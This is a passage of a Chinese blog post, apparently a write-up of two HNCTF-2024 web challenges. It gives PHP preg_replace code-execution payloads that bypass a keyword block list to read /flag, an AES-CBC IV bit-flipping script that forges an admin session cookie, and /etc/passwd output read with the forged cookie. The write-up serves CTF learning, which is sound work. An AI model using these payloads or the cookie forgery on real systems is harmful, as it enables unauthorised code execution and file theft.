<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="light"><link rel="canonical" href="http://example.com/posts/5ae288a7/"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico"><link rel="icon" href="/img/favicon.ico"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#dff9fb"><meta name="author" content="Fanllspd"><meta name="keywords" content="blog"><meta name="description" content="阴间时间，抽空看了几题 [Web]Please_RCE_Me123456789101112131415&lt;?phpif($_GET[&amp;#x27;moran&amp;#x27;] &#x3D;&#x3D;&#x3D; &amp;#x27;flag&amp;#x27;)&amp;#123;    highlight_file(__FILE__);    if(isset($_POST[&amp;#x27;task&amp;#x27;])&amp;&amp;isset($_P"><meta property="og:type" content="article"><meta property="og:title" content="HNCTF-2024"><meta property="og:url" content="http://example.com/posts/5ae288a7/index.html"><meta property="og:site_name" content="Fanllspd&#39;s Blog"><meta property="og:description" content="阴间时间，抽空看了几题 [Web]Please_RCE_Me123456789101112131415&lt;?phpif($_GET[&amp;#x27;moran&amp;#x27;] &#x3D;&#x3D;&#x3D; &amp;#x27;flag&amp;#x27;)&amp;#123;    highlight_file(__FILE__);    if(isset($_POST[&amp;#x27;task&amp;#x27;])&amp;&amp;isset($_P"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/index_img/HNCTF2024.png"><meta property="article:published_time" content="2024-05-13T15:54:24.000Z"><meta property="article:modified_time" content="2024-05-13T17:03:19.976Z"><meta property="article:author" content="Fanllspd"><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://example.com/index_img/HNCTF2024.png"><meta name="referrer" content="no-referrer-when-downgrade"><title>HNCTF-2024 - Fanllspd&#39;s Blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/cloudedGlass.css"><link rel="stylesheet" href="/css/walineBg.css"><link rel="stylesheet" href="/css/scrollAnimation.css"><link rel="stylesheet" href="/css/macpanel.css"><link rel="stylesheet" href="/css/CatLoading.css"><link rel="stylesheet" href="/css/backgroundize.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var CONFIG={hostname:"example.com",root:"/",version:"1.9.5",typing:{enable:!0,typeSpeed:80,cursorChar:"_",loop:!0,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#2299dd",options:{easing:"ease",speed:500,showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!0,baidu:null,google:{measurement_id:null},tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml",include_content_in_search:!0};if(CONFIG.web_analytics.follow_dnt){var dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack;Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on"))}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><script async>Fluid.ctx.dnt||Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=",(function(){function a(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],a("js",new Date),a("config","")}))</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="cat__scene"><div class="cat__main"><div class="cat__body"></div><div class="cat__body"></div><div class="cat__tail"></div><div class="cat__head"></div></div></div></div><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>悟已往之不谏，知来者之可追</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> <span class="nav-link-text">首页</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> <span class="nav-link-text">归档</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> <span class="nav-link-text">分类</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> <span class="nav-link-text">标签</span></a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> <span class="nav-link-text">关于</span></a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> <span class="nav-link-text">友链</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/index_img/HNCTF2024.png) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="HNCTF-2024"></span></div><div class="mt-3"><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden="true"></i> Fanllspd </span><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2024-05-13 23:54" pubdate>2024年5月13日 晚上</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 17k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 145 分钟 </span><span id="busuanzi_container_page_pv" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="busuanzi_value_page_pv"></span> 次</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar category-bar" style="margin-right:-1rem"><div class="category-list"><div class="category row nomargin-x"><a class="category-item list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CTF" id="heading-59db9139e685f7d6a4a8784f9221066f" role="tab" data-toggle="collapse" href="#collapse-59db9139e685f7d6a4a8784f9221066f" aria-expanded="true">CTF <span class="list-group-count">(12)</span> <i class="iconfont icon-arrowright"></i></a><div class="category-collapse collapse show" id="collapse-59db9139e685f7d6a4a8784f9221066f" role="tabpanel" aria-labelledby="heading-59db9139e685f7d6a4a8784f9221066f"><div class="category-post-list"><a href="/posts/43716/" title="CNSS 2023 Recruit WriteUps~~~" class="list-group-item list-group-item-action"><span class="category-post">CNSS 2023 Recruit WriteUps~~~</span> </a><a href="/posts/3f2e31d4/" title="DiceCtf 2024 Quals Web WriteUps" class="list-group-item list-group-item-action"><span class="category-post">DiceCtf 2024 Quals Web WriteUps</span> </a><a href="/posts/b4162f1f/" title="HGAME 2024 WEEK-1 WriteUps" class="list-group-item list-group-item-action"><span class="category-post">HGAME 2024 WEEK-1 WriteUps</span> </a><a href="/posts/feba5816/" title="HGAME-2024-WEEK-2 WriteUps" class="list-group-item list-group-item-action"><span class="category-post">HGAME-2024-WEEK-2 WriteUps</span> </a><a href="/posts/7bf98902/" title="HGAME-2024-WEEK-3 WriteUps" class="list-group-item list-group-item-action"><span class="category-post">HGAME-2024-WEEK-3 WriteUps</span> </a><a href="/posts/5ae288a7/" title="HNCTF-2024" class="list-group-item list-group-item-action active"><span class="category-post">HNCTF-2024</span> </a><a href="/posts/c220aa1/" title="My-First-Penetration" class="list-group-item list-group-item-action"><span class="category-post">My-First-Penetration</span> </a><a href="/posts/a932742f/" title="NSSCTF-Round#20-Basic-WEB" class="list-group-item list-group-item-action"><span class="category-post">NSSCTF-Round#20-Basic-WEB</span> </a><a href="/posts/29460/" title="Viking 2023 Recruit WriteUps~~~" class="list-group-item list-group-item-action"><span class="category-post">Viking 2023 Recruit WriteUps~~~</span> </a><a href="/posts/df9d333d/" title="adworld" class="list-group-item list-group-item-action"><span class="category-post">adworld</span> </a><a href="/posts/14e77824/" title="qsnctf-2024#Round1" class="list-group-item list-group-item-action"><span class="category-post">qsnctf-2024#Round1</span> </a><a href="/posts/34863/" title="有长度限制的RCE注入" class="list-group-item list-group-item-action"><span class="category-post">有长度限制的RCE注入</span></a></div></div></div></div></aside></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">HNCTF-2024</h1><p class="note note-info">本文最后更新于：3 个月前</p><div class="markdown-body"><p><del>阴间时间，抽空看了几题</del></p><h1 id="Web-Please-RCE-Me"><a href="#Web-Please-RCE-Me" class="headerlink" title="[Web]Please_RCE_Me"></a>[Web]Please_RCE_Me</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;moran&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>];<br>        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>一眼 <code>preg_reaplce</code> 命令执行</p><p><code>preg_match(&#39;/please_give_me_flag/&#39;,$str2)</code> 用大小写绕过： <code>please_give_me_flaG</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">task=phpinfo();&amp;flag=please_give_me_flaG // 即可命令执行<br></code></pre></td></tr></table></figure><h2 id="笨方法"><a href="#笨方法" class="headerlink" title="笨方法"></a>笨方法</h2><p>凑函数读根目录，多试几次</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))));<br></code></pre></td></tr></table></figure><p><img src="/posts/5ae288a7/image-20240514000907610.png" srcset="/img/loading.gif" lazyload alt="image-20240514000907610"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag=please_give_me_flaG&amp;task=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))))))));<br></code></pre></td></tr></table></figure><p>反复访问有概率读到 <code>/flag</code></p><h2 id="Better-One"><a href="#Better-One" class="headerlink" title="Better One"></a>Better One</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag=please_give_me_flaG&amp;task=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">22</span>]));&amp;<span class="hljs-number">22</span>=/flag<br></code></pre></td></tr></table></figure><p><img src="/posts/5ae288a7/image-20240514003408485.png" srcset="/img/loading.gif" lazyload alt="image-20240514003408485"></p><h1 id="Web-flipPin"><a href="#Web-flipPin" class="headerlink" title="[Web]flipPin"></a>[Web]flipPin</h1><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, abort<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode<br><br><span class="hljs-keyword">import</span> json<br><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><br>key = get_random_bytes(AES.block_size)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">session</span>):<br>    iv = get_random_bytes(AES.block_size)<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size)))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">session</span>):<br>    raw = b64decode(session)<br>    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])<br>    <span class="hljs-keyword">try</span>:<br>        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>app = Flask(__name__)<br><br>filename_blacklist = &#123;<br>    <span class="hljs-string">&#x27;self&#x27;</span>,<br>    <span class="hljs-string">&#x27;cgroup&#x27;</span>,<br>    <span class="hljs-string">&#x27;mountinfo&#x27;</span>,<br>    <span class="hljs-string">&#x27;env&#x27;</span>,<br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<br>            <span class="hljs-string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session).decode())<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;have a fun&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/hint&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>():<br>    res = Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/read&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>():<br><br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<span class="hljs-string">&quot;you are not logged in&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session))<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        plain_session = decrypt(session)<br>        <span class="hljs-keyword">if</span> plain_session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;don\&#x27;t hack me&#x27;</span><br><br>        session_data = json.loads(plain_session)<br><br>        <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">&#x27;admin&#x27;</span>] :<br>            filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklist_str <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">for</span> blacklist_str <span class="hljs-keyword">in</span> filename_blacklist):<br>                abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">&#x27;Access to this file is forbidden.&#x27;</span>)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">return</span> f.read()<br>            <span class="hljs-keyword">except</span> FileNotFoundError:<br>                abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">&#x27;File not found.&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">f&#x27;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not an administrator&#x27;</span><br><br><br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">9091</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>根据题名，可以看出是拿 <code>Pin</code> 码执行命令行</p><p>但首先要篡改 <code>session</code> 使 <code>admin: 1</code></p><p><a target="_blank" rel="noopener" href="https://susanou.github.io/Writeups/posts/LINECTF/">LINE CTF | Writeups (susanou.github.io)</a></p><p>搜到类似题目，可以得出 <code>iv ^ ori_plain ^ target_plain = new iv</code></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, bytes_to_long<br><br>key = get_random_bytes(AES.block_size)<br><span class="hljs-comment"># key= b64decode(input(&quot;&quot;))</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">session</span>):<br>    iv = get_random_bytes(AES.block_size)<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="hljs-string">&quot;utf-8&quot;</span>), AES.block_size)))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">session</span>):<br>    raw = b64decode(session)<br>    cipher = AES.new(key, AES.MODE_CBC, raw[: AES.block_size])<br>    <span class="hljs-keyword">try</span>:<br>        res = unpad(cipher.decrypt(raw[AES.block_size :]), AES.block_size).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><br><span class="hljs-comment"># default1_session = &#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><br><span class="hljs-comment"># en = encrypt(default1_session).decode()</span><br>en = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># 访问/拿到的session</span><br>session = en<br>default_session = <span class="hljs-string">b&#x27;&#123;&quot;admin&quot;: 0, &quot;us&#x27;</span>  <span class="hljs-comment"># ername&quot;: &quot;user1&quot;&#125;&#x27;</span><br>target_session = <span class="hljs-string">b&#x27;&#123;&quot;admin&quot;: 1, &quot;us&#x27;</span>  <span class="hljs-comment"># sername&quot;: &quot;user1&quot;&#125;&#x27;</span><br>iv = b64decode(session)[:<span class="hljs-number">16</span>]<br>cipher = b64decode(session)[<span class="hljs-number">16</span>:]<br><br>new_iv_num = bytes_to_long(iv) ^ bytes_to_long(default_session) ^ bytes_to_long(target_session)<br>new_iv = long_to_bytes(new_iv_num, <span class="hljs-number">16</span>)<br><br>exploit = b64encode(new_iv + cipher)<br><span class="hljs-built_in">print</span>(exploit.decode())<br><br><span class="hljs-comment"># a = decrypt(exploit)</span><br><br><span class="hljs-comment"># print(a)</span><br><br></code></pre></td></tr></table></figure><p>拿到新的 <code>session</code> 访问 <code>/read</code></p><p>分别读 <code>/etc/passwd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs /etc/passwd">root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br>halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin<br>postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin<br>xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin<br>guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin ctfUser:x:1000:1000:Linux User,,,:/home/ctfUser:/bin/ash<br></code></pre></td></tr></table></figure><p><code>session</code> 